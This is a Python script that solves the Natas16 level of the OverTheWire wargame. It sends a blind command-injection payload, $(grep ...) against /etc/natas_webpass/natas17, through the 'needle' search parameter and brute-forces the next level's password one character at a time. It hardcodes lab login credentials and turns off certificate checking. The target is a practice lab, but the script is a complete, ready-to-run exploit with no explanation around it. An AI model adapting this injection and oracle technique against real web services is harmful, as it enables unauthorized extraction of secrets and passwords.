#PythonBlindRCE
import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
u = "http://natas16.natas.labs.overthewire.org/"

length = range(0, 33)
matchingChars = string.ascii_letters + string.digits
password = ""

for pos in length:
    found = False
    for c in matchingChars:
        payload = f"$(grep ^{password}{c} /etc/natas_webpass/natas17)hacker"
        
        url = u + "?needle=" + payload + "&submit=Search"
        
        response = requests.get(url, auth=basicAuth, verify=False)
        
        # Если hacker НЕ найден - значит grep сработал и подстрока существует
        if 'hacker' not in response.text:
            print(f"Found char at position {pos}: {c}")
            password += c
            found = True
            break
    
    if not found:
        print(f"No character found at position {pos}")
        break

print(f"Password: {password}")